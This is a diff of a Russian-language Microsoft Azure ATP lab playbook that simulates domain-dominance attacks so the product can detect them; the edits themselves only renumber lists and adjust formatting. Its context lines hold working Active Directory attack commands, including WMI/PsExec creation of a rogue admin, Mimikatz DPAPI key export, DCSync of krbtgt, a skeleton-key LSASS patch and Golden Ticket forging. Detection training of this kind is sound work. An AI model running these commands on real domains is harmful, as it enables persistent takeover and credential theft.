@@ -2,17 +2,17 @@
 title: Сборник схем захвата управления доменом в Azure ATP
 description: Сборник схем захвата управления доменом в Azure ATP описывает, как имитировать атаку захвата управления доменом для обнаружения с помощью Azure ATP.
 ms.service: azure-advanced-threat-protection
-ms.topic: tutorial
+ms.topic: how-to
 author: shsagir
 ms.author: shsagir
 ms.date: 02/28/2019
 ms.reviewer: itargoet
-ms.openlocfilehash: b5903123e992f7540dd660da605a1568bf76ef91
-ms.sourcegitcommit: 63be53de5b84eabdeb8c006438dab45bd35a4ab7
+ms.openlocfilehash: 10266136b495c6fcc04355c8a16ca1c0ea00381c
+ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
 ms.translationtype: HT
 ms.contentlocale: ru-RU
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "79414596"
+ms.lasthandoff: 08/27/2020
+ms.locfileid: "88953751"
 ---
 # <a name="tutorial-domain-dominance-playbook"></a>Руководство. Сборник схем захвата управления доменом
 
@@ -57,19 +57,19 @@ ms.locfileid: "79414596"
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
-2. Теперь, когда пользователь создан, добавьте его в группу администраторов в контроллере домена:
+1. Теперь, когда пользователь создан, добавьте его в группу администраторов в контроллере домена:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
-   ![Добавление нового пользователя в группу администраторов на контроллере домена с использованием удаленного выполнения программного кода (PsExec)](media/playbook-dominance-psexec_addtoadmins.png)
+    ![Добавление нового пользователя в группу администраторов на контроллере домена с использованием удаленного выполнения программного кода (PsExec)](media/playbook-dominance-psexec_addtoadmins.png)
 
-3. Перейдите в раздел **Active Directory Users and Computers (ADUC)** (Пользователи и компьютеры Active Directory (ADUC)) в **ContosoDC** и найдите **InsertedUser**. 
+1. Перейдите в раздел **Active Directory Users and Computers (ADUC)** (Пользователи и компьютеры Active Directory (ADUC)) в **ContosoDC** и найдите **InsertedUser**. 
 
-4. Щелкните правой кнопкой мыши **Свойства** и проверьте членство.
+1. Щелкните правой кнопкой мыши **Свойства** и проверьте членство.
 
-   ![Просмотр свойств InsertedUser](media/playbook-dominance-inserteduser_properties.png)
+    ![Просмотр свойств InsertedUser](media/playbook-dominance-inserteduser_properties.png)
 
 Выступая в качестве злоумышленника, вы успешно создали нового пользователя в лаборатории с использованием инструментария WMI. Вы также добавили нового пользователя в группу администраторов с помощью PsExec. С целью устойчивости на контроллере домена была создана другая правомерная, независимая учетная запись. Новые учетные данные дают злоумышленнику постоянный доступ к контроллеру домена в случае обнаружения и удаления предыдущего доступа к учетным данным.
 
@@ -103,9 +103,9 @@ ms.locfileid: "79414596"
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
-   ![Экспорт резервной копии ключа DPAPI из Active Directory с помощью Mimikatz](media/playbook-dominance-dpapi_mimikatz.png)
+    ![Экспорт резервной копии ключа DPAPI из Active Directory с помощью Mimikatz](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. Убедитесь, что файл основного ключа экспортирован. Проверьте каталог, из которого запускали mimikatz.exe, чтобы увидеть файлы DER, PFX, PVK и KEY. Скопируйте устаревший ключ из командной строки.
+1. Убедитесь, что файл основного ключа экспортирован. Проверьте каталог, из которого запускали mimikatz.exe, чтобы увидеть файлы DER, PFX, PVK и KEY. Скопируйте устаревший ключ из командной строки.
 
 Как и у злоумышленников, у нас теперь есть ключ для расшифровки любого файла или конфиденциальных данных, зашифрованных с помощью DPAPI, с *любого* компьютера во всем лесу.
 
@@ -151,15 +151,15 @@ mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\t
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
-2. С помощью инструмента **Mimikatz**, который размещен в контроллере домена, удаленно выполните следующий код через PsExec:
+1. С помощью инструмента **Mimikatz**, который размещен в контроллере домена, удаленно выполните следующий код через PsExec:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
-3. Вы успешно исправили процесс LSASS в **ContosoDC**.
+1. Вы успешно исправили процесс LSASS в **ContosoDC**.
 
-   ![Атака с использованием мастер-ключа через Mimikatz](media/playbook-dominance-skeletonkey.png)
+    ![Атака с использованием мастер-ключа через Mimikatz](media/playbook-dominance-skeletonkey.png)
 
 ### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Использование LSASS, исправленного с помощью мастер-ключа
 
@@ -202,25 +202,25 @@ runas /user:ronhd@contoso.azure "notepad"
    whoami /user
    ```
 
-   ![Идентификатор безопасности для пользователя Golden Ticket](media/playbook-dominance-golden_whoamisid.png)
+    ![Идентификатор безопасности для пользователя Golden Ticket](media/playbook-dominance-golden_whoamisid.png)
 
-2. Определите и скопируйте ИД безопасности домена, показанный на приведенном выше снимке экрана.
+1. Определите и скопируйте ИД безопасности домена, показанный на приведенном выше снимке экрана.
 
-3. С помощью **Mimikatz** используйте скопированный ИД безопасности домена вместе с украденным NTLM-хэшем пользователя krbtgt для создания TGT. Вставьте следующий текст в cmd.exe от имени пользователя JeffL:
+1. С помощью **Mimikatz** используйте скопированный ИД безопасности домена вместе с украденным NTLM-хэшем пользователя krbtgt для создания TGT. Вставьте следующий текст в cmd.exe от имени пользователя JeffL:
 
    ``` cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
-   ![Создание Golden Ticket](media/playbook-dominance-golden_generate.png)
+    ![Создание Golden Ticket](media/playbook-dominance-golden_generate.png)
 
    Часть ```/ptt``` команды позволяет немедленно передать созданный билет в память.
 
-4. Давайте убедимся, что учетные данные находятся в памяти.  Выполните ```klist``` в консоли.
+1. Давайте убедимся, что учетные данные находятся в памяти.  Выполните ```klist``` в консоли.
 
-   ![Результаты klist после передачи созданного билета](media/playbook-dominance-golden_klist.png)
+    ![Результаты klist после передачи созданного билета](media/playbook-dominance-golden_klist.png)
 
-5. Выступая в качестве злоумышленника, выполните следующую команду передачи билета, чтобы использовать ее на контроллере домена:
+1. Выступая в качестве злоумышленника, выполните следующую команду передачи билета, чтобы использовать ее на контроллере домена:
 
    ``` cmd
    dir \\ContosoDC\c$
@@ -228,7 +228,7 @@ runas /user:ronhd@contoso.azure "notepad"
 
    Успешно. Вы сформировали **фальшивый** Golden Ticket для пользователя SamiraA.
 
-   ![Выполнение атаки Golden Ticket с помощью Mimikatz](media/playbook-dominance-golden_ptt.png)
+    ![Выполнение атаки Golden Ticket с помощью Mimikatz](media/playbook-dominance-golden_ptt.png)
 
 Почему это сработало? Атака Golden Ticket работает из-за того, что созданный билет был правильно подписан с помощью ключа KRBTGT, который был получен ранее. Этот билет позволяет нам, как злоумышленнику, получить доступ к ContosoDC и добавить себя в любую нужную группу безопасности.
 
@@ -239,7 +239,7 @@ Azure ATP использует несколько методов для обна
 ![Атака Golden Ticket была обнаружена](media/playbook-dominance-golden_detected.png)
 
 > [!Important]
->Напоминание. До тех пор, пока полученный злоумышленником ключ KRBTGT остается допустимым в среде, созданные с его помощью билеты также остаются действительными. В этом случае злоумышленник достигает устойчивого захвата управления доменом, [пока KRBTGT не буде сброшен дважды](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
+>Напоминание. До тех пор, пока полученный злоумышленником ключ KRBTGT остается допустимым в среде, созданные с его помощью билеты также остаются действительными. В этом случае злоумышленник достигает устойчивого захвата управления доменом, [пока KRBTGT не буде сброшен дважды](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
 
 ## <a name="next-steps"></a>Дальнейшие шаги
 
